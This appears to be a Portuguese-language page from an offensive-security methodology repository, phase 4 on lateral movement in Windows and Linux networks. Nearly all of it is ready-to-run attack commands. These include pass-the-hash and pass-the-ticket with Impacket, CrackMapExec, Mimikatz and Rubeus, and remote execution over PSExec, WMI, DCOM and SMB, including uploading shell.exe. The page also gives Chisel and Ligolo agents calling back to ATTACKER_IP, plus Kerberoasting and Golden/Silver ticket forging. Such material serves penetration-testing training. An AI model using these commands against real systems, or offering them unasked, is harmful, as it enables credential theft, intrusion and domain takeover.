# ➡️ Fase 4: Movimento lateral

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Objetivo:** Passar do sistema comprometido para outros sistemas da rede.

> **Nota de leitura:** Pass-the-Hash reutiliza um hash para autenticação; Pass-the-Ticket reutiliza um ticket Kerberos; Pass-the-Certificate utiliza um certificado. Pivoting usa um sistema intermédio para alcançar outra rede. A tabela de portas e permissões é resumida: a configuração e as autorizações efetivas do serviço continuam a ser determinantes. Os túneis SOCKS transportam ligações TCP compatíveis; não se deve assumir que todos os tipos de análise do Nmap funcionam através de `proxychains`.

---

## 🔑 Movimento baseado em credenciais

### Pass-the-Hash (PTH)
```bash
# Impacket PSExec com hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Exportar o ticket da memória (Mimikatz)
sekurlsa::tickets /export

# Importar o ticket
kerberos::ptt ticket.kirbi

# Ou com Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verificar o ticket
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz — pedir um TGT com um hash NTLM
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Utilizar o certificado para autenticação
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Com Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Métodos de execução remota

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (mais discreto)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM com palavra-passe
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM com hash
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# Acesso remoto com PowerShell
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# Execução de comandos com CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Cópia de ficheiros por SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# Ao estilo do PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# Com hash NTLM (modo Restricted Admin)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Ativar RDP remotamente
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH com palavra-passe
ssh user@192.168.1.10

# SSH com chave
ssh -i id_rsa user@192.168.1.10

# Túneis SSH/pivoting
ssh -D 9050 user@192.168.1.10  # Proxy SOCKS
ssh -L 8080:internal:80 user@192.168.1.10  # Reencaminhamento de porta local
```

---

## 🔄 Pivoting de rede (acesso a outras redes através de um sistema intermédio)

### Túneis SSH
```bash
# Reencaminhamento de porta local (aceder a internal:80 através de localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Proxy SOCKS dinâmico
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Reencaminhamento de porta remoto
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# No sistema atacante (servidor)
./chisel server --reverse --port 8080

# No sistema alvo (cliente)
./chisel client ATTACKER_IP:8080 R:socks

# Utilizar com proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# No sistema atacante
./proxy -selfcert

# No sistema alvo
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Na consola do proxy
session
start
```

### Pivoting com Metasploit
```bash
# Adicionar uma rota através da sessão Meterpreter
run autoroute -s 192.168.2.0/24

# Ou manualmente
route add 192.168.2.0 255.255.255.0 1

# Proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Ataques a Kerberos

### Kerberoasting
```bash
# Obter tickets de serviço
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Quebrar os hashes com hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Procurar utilizadores sem pré-autenticação
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Quebrar o hash
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Obter primeiro o hash de krbtgt e depois:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Criar um ticket para um serviço específico
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Referência rápida

### Técnicas de movimento lateral

| Técnica | Porta | Ferramenta |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Credenciais necessárias

| Método | Requisito |
|--------|-------------|
| Pass-the-Hash | Hash NTLM |
| Pass-the-Ticket | Ticket Kerberos |
| PSExec | Administrador + acesso SMB |
| WinRM | WinRM ativado + administrador |
| RDP | RDP ativado + pertença ao grupo de RDP |

---

## 🔗 Guias de referência relacionados

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**Fase anterior:** [← 03 - Escalada de privilégios](./03-Privilege-Escalation.pt.md)

**Fase seguinte:** [05 - Persistência →](./05-Persistence.pt.md)
